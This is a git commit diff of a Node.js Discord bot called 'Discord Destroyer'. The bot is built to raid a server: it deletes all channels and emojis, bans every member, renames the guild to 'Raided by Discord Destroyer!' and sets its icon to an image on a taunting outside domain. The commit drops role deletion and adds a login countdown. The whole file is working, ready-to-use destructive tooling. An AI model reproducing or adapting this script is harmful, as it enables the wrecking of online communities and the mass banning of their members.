f1ffe220d9fc55e66e4f5d7cf64802ec866722fd
oskikiboy <oscardavies1@gmail.com>
2018-01-21 01:38:35 +1000

    Remove broken roles deleter, added count down, guild icon of no pixels.

--- index.js
+++ index.js
@@ -7,9 +7,9 @@ const packageVersion = require("./package.json").version;
 
 // Settings for the bot.
 const settings = {
-    botToken: "YOUR TOKEN ID HERE",
+    botToken: "YOUR TOKEN HERE",
     guildID: "YOUR GUILD ID HERE",
-    guildName: "NAME YOU WANT GUILD TO BE RENAMED TO",
+    guildName: "Raided by Discord Destroyer!",
 };
 
 console.info(`\x1b[44mINFO\x1b[0m: Starting Discord Destroyer, Version: ${packageVersion}. ~(˘▾˘~)`);
@@ -18,52 +18,58 @@ console.info(`\x1b[44mINFO\x1b[0m: Starting Discord Destroyer, Version: ${packag
 client.once('ready', () => {
     // Success msg.
     console.info(`\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
-    
+
     // Get the guild using the ID.
     let guild = client.guilds.get(settings.guildID);
-    
+
     // Delete all channels.
     guild.channels.forEach(c => {
         c.delete();
         console.info(`\x1b[44mINFO\x1b[0m: Deleted channel ${c.name}; ID: ${c.id}. (╯°□°）╯︵ ┻━┻`);
     });
-    
-    // Delete all roles.
-    guild.roles.forEach(r => {
-        r.delete();
-        console.info(`\x1b[44mINFO\x1b[0m: Deleted role ${r.name}; ID: ${r.id}. (╯°□°）╯︵ ┻━┻`);
-    });
-    
+
     // Delete all emojis.
     guild.emojis.forEach(e => {
         guild.deleteEmoji(e);
         console.info(`\x1b[44mINFO\x1b[0m: Deleted emoji ${e.name}; ID: ${e.id}. (╯°□°）╯︵ ┻━┻`);
     });
-    
+
     // Ban all users.
     guild.members.forEach(m => {
         m.ban();
         console.info(`\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
     });
-    
+
     // Set the guild icon to nothing.
-    guild.setIcon(null);
-    
+    guild.setIcon("https://china.hacked-my.computer/95314b55.png");
+
     // Set the guild name to the desired name.
     guild.setName(settings.guildName);
 });
 
-// Login into the bot
-client.login(settings.botToken);
+// Login into the bot using a timer.
+setTimeout(function () {
+    console.log("\x1b[31m3\x1b[0m");
+    setTimeout(function () {
+        console.log("\x1b[33m2\x1b[0m");
+        setTimeout(function () {
+            console.log("\x1b[32m1\x1b[0m");
+            setTimeout(function () {
+                console.log("\x1b[37m\x1b[1mGO\x1b[0m");
+                client.login(settings.botToken);
+            }, 1000)
+        }, 1000)
+    }, 1000)
+}, 1000)
 
 // Some what handle uncaught exceptions.
 process.on("uncaughtException", err => {
-	console.error("\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x\n", err);
-	process.exit(1);
+    console.error("\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x\n", err);
+    process.exit(1);
 });
 
 // Some what handle unhandled rejections.
 process.on("unhandledRejection", err => {
-	console.error("\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x\n", err);
-	process.exit(1);
+    console.error("\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x\n", err);
+    process.exit(1);
 });
